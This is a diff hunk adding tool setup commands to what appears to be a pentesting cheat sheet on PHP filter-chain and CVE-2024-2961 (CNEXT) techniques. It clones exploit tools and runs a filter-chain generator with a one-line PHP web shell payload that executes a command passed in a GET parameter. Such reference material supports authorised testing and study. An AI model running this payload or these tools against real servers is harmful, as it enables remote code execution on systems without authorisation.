@@ -541,6 +541,25 @@ wrapwrap: force prefix/suffix around filter output to satisfy parsers.
 CNEXT / CVE-2024-2961: turn certain PHP file-read primitives into RCE.
 ```
 
+Tool links and usage:
+
+```bash
+# CNEXT exploits
+git clone --recurse-submodules https://github.com/ambionics/cnext-exploits.git
+cd cnext-exploits
+python3 -m pip install -r requirements.txt
+
+# PHP filter chain generator
+git clone https://github.com/synacktiv/php_filter_chain_generator
+cd php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
+
+# wrapwrap
+git clone https://github.com/ambionics/wrapwrap
+cd wrapwrap
+python3 wrapwrap.py --help
+```
+
 Important distinction:
 
 ```text
